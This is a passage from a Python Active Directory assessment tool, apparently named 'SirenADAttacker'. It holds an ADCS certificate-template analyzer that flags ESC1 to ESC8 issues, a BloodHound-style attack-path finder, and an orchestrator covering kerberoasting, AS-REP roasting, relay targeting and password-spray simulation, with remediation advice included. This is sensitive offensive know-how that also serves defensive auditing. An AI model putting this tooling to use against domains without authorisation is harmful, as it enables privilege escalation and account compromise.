            self._findings.clear()
            start = time.time()

            if controlled_sids is None:
                controlled_sids = set()

            # Parse templates
            for tmpl_dict in templates:
                tmpl = CertTemplate(
                    name=tmpl_dict.get("name", ""),
                    display_name=tmpl_dict.get("display_name", ""),
                    oid=tmpl_dict.get("oid", ""),
                    schema_version=tmpl_dict.get("schema_version", 0),
                    enrollment_flags=tmpl_dict.get("enrollment_flags", 0),
                    authorized_signatures=tmpl_dict.get("authorized_signatures", 0),
                    enrollee_supplies_subject=tmpl_dict.get("enrollee_supplies_subject", False),
                    client_auth=tmpl_dict.get("client_auth", False),
                    any_purpose=tmpl_dict.get("any_purpose", False),
                    enrollment_agent=tmpl_dict.get("enrollment_agent", False),
                    enroll_permissions=tmpl_dict.get("enroll_permissions", []),
                    write_permissions=tmpl_dict.get("write_permissions", []),
                    owner=tmpl_dict.get("owner", ""),
                    ca_name=tmpl_dict.get("ca_name", ""),
                    validity_period=tmpl_dict.get("validity_period", ""),
                    renewal_period=tmpl_dict.get("renewal_period", ""),
                )
                self._templates.append(tmpl)

                # Check ESC1: SAN + Client Auth + enrollable
                if self._check_esc1(tmpl, controlled_sids):
                    tmpl.esc_paths.append(ESCType.ESC1)
                    self._esc_paths.append(self._build_esc_entry(ESCType.ESC1, tmpl))

                # Check ESC2: Any Purpose or SubCA
                if self._check_esc2(tmpl, controlled_sids):
                    tmpl.esc_paths.append(ESCType.ESC2)
                    self._esc_paths.append(self._build_esc_entry(ESCType.ESC2, tmpl))

                # Check ESC3: Enrollment agent
                if self._check_esc3(tmpl, controlled_sids):
                    tmpl.esc_paths.append(ESCType.ESC3)
                    self._esc_paths.append(self._build_esc_entry(ESCType.ESC3, tmpl))

                # Check ESC4: Writable template
                if self._check_esc4(tmpl, controlled_sids):
                    tmpl.esc_paths.append(ESCType.ESC4)
                    self._esc_paths.append(self._build_esc_entry(ESCType.ESC4, tmpl))

            # Check CA-level issues
            for ca in ca_info:
                # ESC5: CA ACL abuse
                if self._check_esc5(ca, controlled_sids):
                    self._esc_paths.append({
                        "esc_type": ESCType.ESC5.name,
                        "target": ca.get("name", ""),
                        "description": self.ESC_DESCRIPTIONS[ESCType.ESC5],
                        "severity": self.ESC_SEVERITY[ESCType.ESC5].name,
                        "ca_name": ca.get("name", ""),
                        "details": ca,
                    })

                # ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
                if ca.get("editf_attributesubjectaltname2", False):
                    self._esc_paths.append({
                        "esc_type": ESCType.ESC6.name,
                        "target": ca.get("name", ""),
                        "description": self.ESC_DESCRIPTIONS[ESCType.ESC6],
                        "severity": self.ESC_SEVERITY[ESCType.ESC6].name,
                        "ca_name": ca.get("name", ""),
                        "details": {"flag": "EDITF_ATTRIBUTESUBJECTALTNAME2"},
                    })

                # ESC7: ManageCA/ManageCertificates
                if self._check_esc7(ca, controlled_sids):
                    self._esc_paths.append({
                        "esc_type": ESCType.ESC7.name,
                        "target": ca.get("name", ""),
                        "description": self.ESC_DESCRIPTIONS[ESCType.ESC7],
                        "severity": self.ESC_SEVERITY[ESCType.ESC7].name,
                        "ca_name": ca.get("name", ""),
                        "details": ca,
                    })

                # ESC8: HTTP enrollment
                if ca.get("web_enrollment_enabled", False):
                    has_ntlm = ca.get("ntlm_enabled", True)
                    has_epa = ca.get("epa_enabled", False)
                    if has_ntlm and not has_epa:
                        self._esc_paths.append({
                            "esc_type": ESCType.ESC8.name,
                            "target": ca.get("name", ""),
                            "description": self.ESC_DESCRIPTIONS[ESCType.ESC8],
                            "severity": self.ESC_SEVERITY[ESCType.ESC8].name,
                            "ca_name": ca.get("name", ""),
                            "details": {
                                "web_enrollment": True,
                                "ntlm": has_ntlm,
                                "epa": has_epa,
                            },
                        })

            self._generate_cert_findings()

            elapsed = time.time() - start
            logger.info(
                "Analyzed %d templates, found %d ESC paths in %.3fs",
                len(templates), len(self._esc_paths), elapsed,
            )
            return list(self._esc_paths)

    def get_esc_paths(self) -> List[Dict[str, Any]]:
        """Return identified ESC paths."""
        with self._lock:
            return list(self._esc_paths)

    def get_findings(self) -> List[ADFinding]:
        """Return certificate abuse findings."""
        with self._lock:
            return list(self._findings)

    def _check_esc1(self, tmpl: CertTemplate, sids: Set[str]) -> bool:
        """Check ESC1: SAN + Client Auth + enrollment by low-priv."""
        if not tmpl.enrollee_supplies_subject:
            return False
        if not (tmpl.client_auth or tmpl.any_purpose):
            return False
        if tmpl.authorized_signatures > 0:
            return False
        # Check if any controlled SID can enroll
        for perm in tmpl.enroll_permissions:
            if perm.get("sid", "") in sids:
                return True
        return len(sids) == 0  # If no SIDs specified, flag for review

    def _check_esc2(self, tmpl: CertTemplate, sids: Set[str]) -> bool:
        """Check ESC2: Any Purpose or SubCA."""
        if not tmpl.any_purpose:
            return False
        for perm in tmpl.enroll_permissions:
            if perm.get("sid", "") in sids:
                return True
        return len(sids) == 0

    def _check_esc3(self, tmpl: CertTemplate, sids: Set[str]) -> bool:
        """Check ESC3: Enrollment agent template."""
        if not tmpl.enrollment_agent:
            return False
        for perm in tmpl.enroll_permissions:
            if perm.get("sid", "") in sids:
                return True
        return len(sids) == 0

    def _check_esc4(self, tmpl: CertTemplate, sids: Set[str]) -> bool:
        """Check ESC4: Writable template ACLs."""
        for perm in tmpl.write_permissions:
            sid = perm.get("sid", "")
            if sid in sids:
                return True
        if tmpl.owner in sids:
            return True
        return False

    def _check_esc5(self, ca: Dict[str, Any], sids: Set[str]) -> bool:
        """Check ESC5: CA object ACL abuse."""
        for perm in ca.get("permissions", []):
            sid = perm.get("sid", "")
            mask = perm.get("access_mask", 0)
            if sid in sids and (mask & 0x10000000 or mask & 0x40000000):
                return True
        return False

    def _check_esc7(self, ca: Dict[str, Any], sids: Set[str]) -> bool:
        """Check ESC7: ManageCA or ManageCertificates."""
        manage_ca = set(ca.get("manage_ca_sids", []))
        manage_certs = set(ca.get("manage_certificates_sids", []))
        return bool(sids & manage_ca) or bool(sids & manage_certs)

    def _generate_cert_findings(self) -> None:
        """Generate findings from ADCS analysis."""
        if not self._esc_paths:
            return

        esc_counts: Dict[str, int] = defaultdict(int)
        for path in self._esc_paths:
            esc_counts[path["esc_type"]] += 1

        for esc_name, count in esc_counts.items():
            esc_type = ESCType[esc_name]
            self._findings.append(ADFinding(
                title=f"{esc_name}: {count} vulnerable path(s) found",
                description=self.ESC_DESCRIPTIONS[esc_type],
                severity=self.ESC_SEVERITY[esc_type],
                phase=AttackPhase.PRIVILEGE_ESCALATION,
                affected_objects=[
                    p["target"] for p in self._esc_paths
                    if p["esc_type"] == esc_name
                ],
                evidence={
                    "esc_type": esc_name,
                    "count": count,
                    "paths": [
                        p for p in self._esc_paths
                        if p["esc_type"] == esc_name
                    ],
                },
                mitre_technique="T1649",
                remediation=self._get_esc_remediation(esc_type),
                confidence=0.93,
                tags=["adcs", esc_name.lower(), "certificate-abuse"],
            ))

    @staticmethod
    def _build_esc_entry(esc_type: ESCType, tmpl: CertTemplate) -> Dict[str, Any]:
        """Build an ESC path entry dictionary."""
        return {
            "esc_type": esc_type.name,
            "target": tmpl.name,
            "description": CertificateAbuser.ESC_DESCRIPTIONS[esc_type],
            "severity": CertificateAbuser.ESC_SEVERITY[esc_type].name,
            "template_name": tmpl.name,
            "ca_name": tmpl.ca_name,
            "details": tmpl.to_dict(),
        }

    @staticmethod
    def _get_esc_remediation(esc_type: ESCType) -> str:
        """Get remediation advice for an ESC type."""
        remediations: Dict[ESCType, str] = {
            ESCType.ESC1: "Disable 'Supply in the request' on template; require manager approval.",
            ESCType.ESC2: "Remove 'Any Purpose' EKU; restrict to specific purposes.",
            ESCType.ESC3: "Restrict enrollment agent permissions; require manager approval.",
            ESCType.ESC4: "Audit and fix template ACLs; remove write permissions from non-admins.",
            ESCType.ESC5: "Audit CA object ACLs; restrict to CA admins only.",
            ESCType.ESC6: "Disable EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA (certutil -setreg).",
            ESCType.ESC7: "Remove ManageCA/ManageCertificates from non-admin principals.",
            ESCType.ESC8: "Disable HTTP enrollment; require HTTPS with EPA; disable NTLM on IIS.",
        }
        return remediations.get(esc_type, "Review and harden ADCS configuration.")


# ════════════════════════════════════════════════════════════════════════════════
# BLOODHOUND ANALYZER
# ════════════════════════════════════════════════════════════════════════════════

class BloodHoundAnalyzer:
    """
    Attack path analysis engine using BFS and Dijkstra algorithms.

    Builds an attack graph and finds shortest paths to high-value targets
    (Domain Admins, Enterprise Admins, DCs).

    Usage:
        analyzer = BloodHoundAnalyzer("corp.local")
        analyzer.add_node(GraphNode(name="user1", node_type=NodeType.USER))
        analyzer.add_edge(GraphEdge(source_id="A", target_id="B", edge_type=EdgeType.MEMBER_OF))
        paths = analyzer.find_shortest_path_to_da("user1")
    """

    # Edge weights for cost calculation
    EDGE_WEIGHTS: Dict[EdgeType, float] = {
        EdgeType.MEMBER_OF: 0.1,
        EdgeType.HAS_SESSION: 1.0,
        EdgeType.ADMIN_TO: 1.5,
        EdgeType.CAN_RDP: 2.0,
        EdgeType.CAN_PSREMOTE: 2.0,
        EdgeType.EXECUTE_DCOM: 2.5,
        EdgeType.GENERIC_ALL: 0.5,
        EdgeType.GENERIC_WRITE: 0.8,
        EdgeType.WRITE_DACL: 1.0,
        EdgeType.WRITE_OWNER: 1.0,
        EdgeType.OWNS: 0.5,
        EdgeType.ADD_MEMBER: 0.8,
        EdgeType.FORCE_CHANGE_PASSWORD: 1.2,
        EdgeType.READ_LAPS_PASSWORD: 1.5,
        EdgeType.READ_GMSA_PASSWORD: 1.0,
        EdgeType.ALLOWED_TO_DELEGATE: 2.0,
        EdgeType.ALLOWED_TO_ACT: 2.0,
        EdgeType.HAS_SID_HISTORY: 0.3,
        EdgeType.CONTAINS: 0.0,
        EdgeType.GP_LINK: 0.5,
        EdgeType.TRUSTED_BY: 1.5,
        EdgeType.DCSYNC: 0.1,
        EdgeType.ENROLL: 1.5,
        EdgeType.WRITE_PKI: 1.0,
    }

    # High-value target patterns
    HIGH_VALUE_NAMES: Set[str] = {
        "Domain Admins", "Enterprise Admins", "Schema Admins",
        "Administrators", "Domain Controllers",
        "KRBTGT", "Administrator",
    }

    def __init__(self, domain: str) -> None:
        self._lock = threading.RLock()
        self._domain = domain
        self._nodes: Dict[str, GraphNode] = {}
        self._edges: List[GraphEdge] = []
        self._adjacency: Dict[str, List[Tuple[str, GraphEdge]]] = defaultdict(list)
        self._reverse_adj: Dict[str, List[Tuple[str, GraphEdge]]] = defaultdict(list)
        self._findings: List[ADFinding] = []
        logger.info("BloodHoundAnalyzer initialized for domain '%s'", domain)

    def add_node(self, node: GraphNode) -> None:
        """Add a node to the attack graph."""
        with self._lock:
            self._nodes[node.node_id] = node
            # Auto-mark high-value targets
            if node.name in self.HIGH_VALUE_NAMES:
                node.is_high_value = True

    def add_edge(self, edge: GraphEdge) -> None:
        """Add an edge to the attack graph."""
        with self._lock:
            # Apply default weight if not set
            if edge.weight == 1.0:
                edge.weight = self.EDGE_WEIGHTS.get(edge.edge_type, 1.0)
            self._edges.append(edge)
            self._adjacency[edge.source_id].append((edge.target_id, edge))
            self._reverse_adj[edge.target_id].append((edge.source_id, edge))

    def add_nodes_bulk(self, nodes: List[GraphNode]) -> None:
        """Add multiple nodes to the graph."""
        for node in nodes:
            self.add_node(node)

    def add_edges_bulk(self, edges: List[GraphEdge]) -> None:
        """Add multiple edges to the graph."""
        for edge in edges:
            self.add_edge(edge)

    def find_shortest_path_bfs(
        self, source_id: str, target_id: str
    ) -> Optional[AttackPath]:
        """
        Find shortest path using BFS (unweighted/hop count).

        Args:
            source_id: Starting node ID.
            target_id: Destination node ID.

        Returns:
            AttackPath or None if no path exists.
        """
        with self._lock:
            if source_id not in self._nodes or target_id not in self._nodes:
                return None

            visited: Set[str] = {source_id}
            queue: deque = deque()
            queue.append((source_id, []))

            while queue:
                current, path_edges = queue.popleft()
                if current == target_id:
                    return self._build_attack_path(
                        source_id, target_id, path_edges, "BFS"
                    )

                for neighbor, edge in self._adjacency.get(current, []):
                    if neighbor not in visited:
                        visited.add(neighbor)
                        queue.append((neighbor, path_edges + [edge]))

            return None

    def find_shortest_path_dijkstra(
        self, source_id: str, target_id: str
    ) -> Optional[AttackPath]:
        """
        Find shortest path using Dijkstra (weighted).

        Args:
            source_id: Starting node ID.
            target_id: Destination node ID.

        Returns:
            AttackPath or None if no path exists.
        """
        with self._lock:
            if source_id not in self._nodes or target_id not in self._nodes:
                return None

            distances: Dict[str, float] = {source_id: 0.0}
            predecessors: Dict[str, Tuple[str, GraphEdge]] = {}
            visited: Set[str] = set()
            # Simple priority queue using list (stdlib only)
            pq: List[Tuple[float, str]] = [(0.0, source_id)]

            while pq:
                # Find minimum distance node
                pq.sort(key=lambda x: x[0])
                dist, current = pq.pop(0)

                if current in visited:
                    continue
                visited.add(current)

                if current == target_id:
                    # Reconstruct path
                    path_edges: List[GraphEdge] = []
                    node = target_id
                    while node in predecessors:
                        prev_node, edge = predecessors[node]
                        path_edges.append(edge)
                        node = prev_node
                    path_edges.reverse()
                    return self._build_attack_path(
                        source_id, target_id, path_edges, "Dijkstra"
                    )

                for neighbor, edge in self._adjacency.get(current, []):
                    if neighbor in visited:
                        continue
                    new_dist = dist + edge.weight
                    if new_dist < distances.get(neighbor, float("inf")):
                        distances[neighbor] = new_dist
                        predecessors[neighbor] = (current, edge)
                        pq.append((new_dist, neighbor))

            return None

    def find_all_paths_to_da(
        self, source_id: str, max_depth: int = 10
    ) -> List[AttackPath]:
        """
        Find all attack paths from source to any DA-equivalent node.

        Args:
            source_id: Starting node ID.
            max_depth: Maximum path depth to search.

        Returns:
            List of AttackPaths sorted by total cost.
        """
        with self._lock:
            da_nodes = [
                nid for nid, node in self._nodes.items()
                if node.is_high_value
            ]
            paths: List[AttackPath] = []

            for target in da_nodes:
                # Try Dijkstra first for weighted path
                path = self.find_shortest_path_dijkstra(source_id, target)
                if path and len(path.hops) <= max_depth:
                    paths.append(path)

            # Sort by total cost
            paths.sort(key=lambda p: p.total_cost)
            return paths

    def find_all_paths_to_target(
        self, source_id: str, target_id: str, max_depth: int = 8
    ) -> List[AttackPath]:
        """
        Find all paths from source to target via DFS with depth limit.

        Args:
            source_id: Starting node ID.
            target_id: Destination node ID.
            max_depth: Maximum depth.

        Returns:
            List of AttackPaths.
        """
        with self._lock:
            if source_id not in self._nodes or target_id not in self._nodes:
                return []

            all_paths: List[AttackPath] = []
            visited: Set[str] = {source_id}

            def _dfs(current: str, edges: List[GraphEdge], depth: int) -> None:
                if depth > max_depth:
                    return
                if current == target_id:
                    path = self._build_attack_path(
                        source_id, target_id, edges, "DFS"
                    )
                    all_paths.append(path)
                    return
                for neighbor, edge in self._adjacency.get(current, []):
                    if neighbor not in visited:
                        visited.add(neighbor)
                        _dfs(neighbor, edges + [edge], depth + 1)
                        visited.discard(neighbor)

            _dfs(source_id, [], 0)
            all_paths.sort(key=lambda p: p.total_cost)
            return all_paths

    def get_node_statistics(self) -> Dict[str, Any]:
        """Return graph statistics."""
        with self._lock:
            type_counts: Dict[str, int] = defaultdict(int)
            for node in self._nodes.values():
                type_counts[node.node_type.name] += 1

            edge_type_counts: Dict[str, int] = defaultdict(int)
            for edge in self._edges:
                edge_type_counts[edge.edge_type.name] += 1

            high_value = sum(1 for n in self._nodes.values() if n.is_high_value)
            owned = sum(1 for n in self._nodes.values() if n.is_owned)

            return {
                "total_nodes": len(self._nodes),
                "total_edges": len(self._edges),
                "node_types": dict(type_counts),
                "edge_types": dict(edge_type_counts),
                "high_value_targets": high_value,
                "owned_nodes": owned,
            }

    def get_findings(self) -> List[ADFinding]:
        """Return analysis findings."""
        with self._lock:
            return list(self._findings)

    def _build_attack_path(
        self,
        source_id: str,
        target_id: str,
        edges: List[GraphEdge],
        algorithm: str,
    ) -> AttackPath:
        """Build an AttackPath from a sequence of edges."""
        hops: List[Dict[str, Any]] = []
        total_cost = 0.0
        techniques: List[str] = []

        for i, edge in enumerate(edges):
            src = self._nodes.get(edge.source_id)
            tgt = self._nodes.get(edge.target_id)
            hop: Dict[str, Any] = {
                "step": i + 1,
                "from": src.name if src else edge.source_id,
                "from_type": src.node_type.name if src else "UNKNOWN",
                "to": tgt.name if tgt else edge.target_id,
                "to_type": tgt.node_type.name if tgt else "UNKNOWN",
                "relationship": edge.edge_type.name,
                "weight": edge.weight,
            }
            hops.append(hop)
            total_cost += edge.weight
            techniques.append(edge.edge_type.name)

        # Calculate risk and feasibility
        hop_count = len(hops)
        risk_score = min(10.0, 10.0 / (1 + total_cost * 0.5))
        feasibility = max(0.0, 1.0 - (hop_count * 0.1) - (total_cost * 0.05))

        src_node = self._nodes.get(source_id)
        tgt_node = self._nodes.get(target_id)

        return AttackPath(
            source_node=src_node.name if src_node else source_id,
            target_node=tgt_node.name if tgt_node else target_id,
            hops=hops,
            total_cost=total_cost,
            techniques=techniques,
            risk_score=risk_score,
            feasibility=feasibility,
            description=(
                f"{algorithm} path: {hop_count} hops, cost={total_cost:.2f}, "
                f"risk={risk_score:.1f}/10"
            ),
        )


# ════════════════════════════════════════════════════════════════════════════════
# SIREN AD ATTACKER — ORCHESTRATOR
# ════════════════════════════════════════════════════════════════════════════════

class SirenADAttacker:
    """
    Main orchestrator for Active Directory offensive operations.

    Coordinates all AD attack modules: enumeration, kerberoasting,
    AS-REP roasting, relay detection, password spraying, GPO abuse,
    certificate abuse, and attack path analysis.

    Usage:
        attacker = SirenADAttacker("corp.local")
        report = attacker.full_assessment(ldap_data, hosts, acl_data)

        # Or individual operations:
        domain_info = attacker.enumerate_domain(ldap_data)
        spns = attacker.kerberoast(ldap_data.get("users", []))
        paths = attacker.find_privesc_paths(graph_data)
    """

    def __init__(self, domain: str) -> None:
        self._lock = threading.RLock()
        self._domain = domain

        # Sub-engines
        self._enumerator = LDAPEnumerator(domain)
        self._kerberoast = KerberoastEngine(domain)
        self._asrep = ASREPRoaster(domain)
        self._dcsync = DCsyncSimulator(domain)
        self._relay = NTLMRelaySimulator(domain)
        self._spray = PasswordSprayEngine(domain)
        self._gpo = GPOAbuser(domain)
        self._cert = CertificateAbuser(domain)
        self._bloodhound = BloodHoundAnalyzer(domain)

        # State
        self._domain_info: Optional[DomainInfo] = None
        self._all_findings: List[ADFinding] = []
        self._report: Optional[ADReport] = None
        self._start_time: float = 0.0

        logger.info("SirenADAttacker initialized for domain '%s'", domain)

    def enumerate_domain(
        self, ldap_data: Dict[str, Any]
    ) -> DomainInfo:
        """
        Perform full LDAP enumeration of the domain.

        Args:
            ldap_data: Dictionary of LDAP query results.

        Returns:
            Populated DomainInfo dataclass.
        """
        with self._lock:
            logger.info("Starting domain enumeration for '%s'", self._domain)
            self._start_time = time.time()
            self._domain_info = self._enumerator.enumerate_all(ldap_data)
            self._all_findings.extend(self._enumerator.get_findings())

            # Set admin users for kerberoast prioritization
            admin_users: Set[str] = set()
            for grp in self._domain_info.admin_groups:
                for member in grp.get("members", []):
                    admin_users.add(member)
            self._kerberoast.set_admin_users(admin_users)

            return self._domain_info

    def kerberoast(
        self,
        users: List[Dict[str, Any]],
        include_disabled: bool = False,
    ) -> List[SPNEntry]:
        """
        Perform Kerberoasting enumeration and analysis.

        Args:
            users: User objects from LDAP.
            include_disabled: Include disabled accounts.

        Returns:
            List of kerberoastable SPNEntry objects.
        """
        with self._lock:
            logger.info("Starting Kerberoast enumeration")
            spns = self._kerberoast.enumerate_spns(users, include_disabled)
            self._all_findings.extend(self._kerberoast.get_findings())
            return spns

    def asrep_roast(
        self,
        users: List[Dict[str, Any]],
        include_disabled: bool = False,
    ) -> List[Dict[str, Any]]:
        """
        Perform AS-REP roasting enumeration.

        Args:
            users: User objects from LDAP.
            include_disabled: Include disabled accounts.

        Returns:
            List of AS-REP roastable account dictionaries.
        """
        with self._lock:
            logger.info("Starting AS-REP roast enumeration")
            targets = self._asrep.find_targets(users, include_disabled)
            self._all_findings.extend(self._asrep.get_findings())
            return targets

    def find_relay_targets(
        self, hosts: List[Dict[str, Any]]
    ) -> List[RelayTarget]:
        """
        Find NTLM relay targets.

        Args:
            hosts: Host dictionaries with service info.

        Returns:
            List of RelayTarget objects.
        """
        with self._lock:
            logger.info("Starting NTLM relay target analysis")
            targets = self._relay.find_relay_targets(hosts)
            self._all_findings.extend(self._relay.get_findings())
            return targets

    def spray_passwords(
        self,
        usernames: List[str],
        passwords: Optional[List[str]] = None,
        year: int = 2026,
    ) -> List[SprayResult]:
        """
        Execute password spray simulation.

        Args:
            usernames: Target usernames.
            passwords: Password list (auto-generated if None).
            year: Year for seasonal password generation.

        Returns:
            List of SprayResult objects.
        """
        with self._lock:
            logger.info("Starting password spray simulation")
            if passwords is None:
                passwords = self._spray.generate_seasonal_passwords(year)
            self._spray.detect_username_format(usernames)
            results = self._spray.spray(usernames, passwords[:20])
            self._all_findings.extend(self._spray.get_findings())
            return results

    def find_privesc_paths(
        self,
        graph_data: Dict[str, Any],
        source_id: Optional[str] = None,
    ) -> List[AttackPath]:
        """
        Find privilege escalation paths in the AD graph.

        Args:
            graph_data: Graph data with nodes and edges.
            source_id: Starting node (or all owned nodes).

        Returns:
            List of AttackPath objects sorted by cost.
        """
        with self._lock:
            logger.info("Starting privilege escalation path analysis")

            # Build graph from data
            for node_data in graph_data.get("nodes", []):
                node = GraphNode(
                    node_id=node_data.get("node_id", ""),
                    name=node_data.get("name", ""),
                    node_type=NodeType[node_data.get("node_type", "USER")],
                    domain=node_data.get("domain", self._domain),
                    properties=node_data.get("properties", {}),
                    is_high_value=node_data.get("is_high_value", False),
                    is_owned=node_data.get("is_owned", False),
                    sid=node_data.get("sid", ""),
                )
                self._bloodhound.add_node(node)

            for edge_data in graph_data.get("edges", []):
                edge = GraphEdge(
                    source_id=edge_data.get("source_id", ""),
                    target_id=edge_data.get("target_id", ""),
                    edge_type=EdgeType[edge_data.get("edge_type", "MEMBER_OF")],
                    weight=edge_data.get("weight", 1.0),
                    properties=edge_data.get("properties", {}),
                )
                self._bloodhound.add_edge(edge)

            # Find paths from specified source or all owned nodes
            all_paths: List[AttackPath] = []
            if source_id:
                paths = self._bloodhound.find_all_paths_to_da(source_id)
                all_paths.extend(paths)
            else:
                owned = [
                    nid for nid, n in self._bloodhound._nodes.items()
                    if n.is_owned
                ]
                for owned_id in owned:
                    paths = self._bloodhound.find_all_paths_to_da(owned_id)
                    all_paths.extend(paths)

            # Generate findings for discovered paths
            if all_paths:
                shortest = all_paths[0]
                self._all_findings.append(ADFinding(
                    title=f"Attack path to DA found: {shortest.source_node} -> {shortest.target_node} ({len(shortest.hops)} hops)",
                    description=(
                        f"Shortest path from '{shortest.source_node}' to "
                        f"'{shortest.target_node}' requires {len(shortest.hops)} hops "
                        f"with cost {shortest.total_cost:.2f}. "
                        f"Techniques: {' -> '.join(shortest.techniques)}"
                    ),
                    severity=FindingSeverity.CRITICAL,
                    phase=AttackPhase.PRIVILEGE_ESCALATION,
                    affected_objects=[
                        h.get("to", "") for h in shortest.hops
                    ],
                    evidence=shortest.to_dict(),
                    mitre_technique="T1078",
                    remediation="Break the attack path by removing the weakest link.",
                    confidence=0.9,
                    tags=["attack-path", "privilege-escalation"],
                ))

            all_paths.sort(key=lambda p: p.total_cost)
            return all_paths

    def analyze_attack_paths(self) -> Dict[str, Any]:
        """
        Analyze the overall AD attack surface.

        Returns:
            Analysis summary dictionary.
        """
        with self._lock:
            stats: Dict[str, Any] = {
                "domain": self._domain,
                "graph_stats": self._bloodhound.get_node_statistics(),
                "kerberoast_stats": self._kerberoast.get_statistics(),
                "asrep_stats": self._asrep.get_statistics(),
                "relay_stats": self._relay.get_statistics(),
                "spray_stats": self._spray.get_statistics(),
                "total_findings": len(self._all_findings),
                "severity_distribution": {},
            }
            for sev in FindingSeverity:
                stats["severity_distribution"][sev.name] = sum(
                    1 for f in self._all_findings if f.severity == sev
                )
            return stats

    def generate_report(self) -> ADReport:
        """
        Generate a comprehensive AD assessment report.

        Returns:
            ADReport with all findings and analysis.
        """
        with self._lock:
            report = ADReport(
                domain=self._domain,
                findings=list(self._all_findings),
                domain_info=self._domain_info.to_dict() if self._domain_info else None,
                attack_paths=[],
                statistics=self.analyze_attack_paths(),
                start_time=self._start_time,
                end_time=time.time(),
            )

            # Sort findings by severity
            severity_order = {
                FindingSeverity.CRITICAL: 0,
                FindingSeverity.HIGH: 1,
                FindingSeverity.MEDIUM: 2,
                FindingSeverity.LOW: 3,
                FindingSeverity.INFO: 4,
            }
            report.findings.sort(
                key=lambda f: severity_order.get(f.severity, 5)
            )

            self._report = report
            logger.info(
                "Report generated: %d findings (%s)",
                len(report.findings),
                ", ".join(
                    f"{k}={v}"
                    for k, v in report.severity_counts().items()
                    if v > 0
                ),
            )
            return report

    def full_assessment(
        self,
        ldap_data: Dict[str, Any],
        hosts: Optional[List[Dict[str, Any]]] = None,
        acl_data: Optional[List[Dict[str, Any]]] = None,
        graph_data: Optional[Dict[str, Any]] = None,
        cert_templates: Optional[List[Dict[str, Any]]] = None,
        ca_info: Optional[List[Dict[str, Any]]] = None,
    ) -> ADReport:
        """
        Execute a full AD assessment pipeline.

        Args:
            ldap_data: LDAP enumeration data.
            hosts: Host list for relay analysis.
            acl_data: ACL entries for DCSync detection.
            graph_data: Graph data for path analysis.
            cert_templates: ADCS templates for ESC detection.
            ca_info: CA server info for ADCS analysis.

        Returns:
            Comprehensive ADReport.
        """
        with self._lock:
            logger.info("Starting full AD assessment for '%s'", self._domain)
            self._start_time = time.time()
            self._all_findings.clear()

            # Phase 1: Domain enumeration
            self.enumerate_domain(ldap_data)

            # Phase 2: Credential attacks
            users = ldap_data.get("users", [])
            self.kerberoast(users)
            self.asrep_roast(users)

            # Phase 3: DCSync detection
            if acl_data is not None:
                group_memberships: Dict[str, List[str]] = {}
                for grp in ldap_data.get("groups", []):
                    group_memberships[grp.get("name", "")] = grp.get("members", [])
                self._dcsync.find_dcsync_paths(acl_data, group_memberships)
                self._all_findings.extend(self._dcsync.get_findings())

            # Phase 4: NTLM relay
            if hosts:
                self.find_relay_targets(hosts)

            # Phase 5: Certificate abuse
            if cert_templates is not None:
                controlled_sids: Set[str] = set()
                # Collect SIDs from owned/controlled principals
                if graph_data:
                    for nd in graph_data.get("nodes", []):
                        if nd.get("is_owned"):
                            controlled_sids.add(nd.get("sid", ""))
                self._cert.analyze_templates(
                    cert_templates, ca_info or [], controlled_sids
                )
                self._all_findings.extend(self._cert.get_findings())

            # Phase 6: GPO abuse
            gpo_data = ldap_data.get("gpos", [])
            if gpo_data:
                controlled_sids_gpo: Set[str] = set()
                if graph_data:
                    for nd in graph_data.get("nodes", []):
                        if nd.get("is_owned"):
                            controlled_sids_gpo.add(nd.get("sid", ""))
                self._gpo.find_writable_gpos(gpo_data, controlled_sids_gpo)
                self._all_findings.extend(self._gpo.get_findings())

            # Phase 7: Attack path analysis
            if graph_data:
                self.find_privesc_paths(graph_data)

            # Generate report
            return self.generate_report()

    def get_all_findings(self) -> List[ADFinding]:
        """Return all findings across all modules."""
        with self._lock:
            return list(self._all_findings)

    def get_findings_by_severity(
        self, severity: FindingSeverity
    ) -> List[ADFinding]:
        """Return findings filtered by severity."""
        with self._lock:
            return [f for f in self._all_findings if f.severity == severity]

    def get_findings_by_phase(
        self, phase: AttackPhase
    ) -> List[ADFinding]:
        """Return findings filtered by attack phase."""
        with self._lock:
            return [f for f in self._all_findings if f.phase == phase]

    def export_json(self) -> str:
        """Export the latest report as JSON string."""
        with self._lock:
            if self._report:
                return json.dumps(self._report.to_dict(), indent=2, default=str)
            return json.dumps({"error": "No report generated yet"})
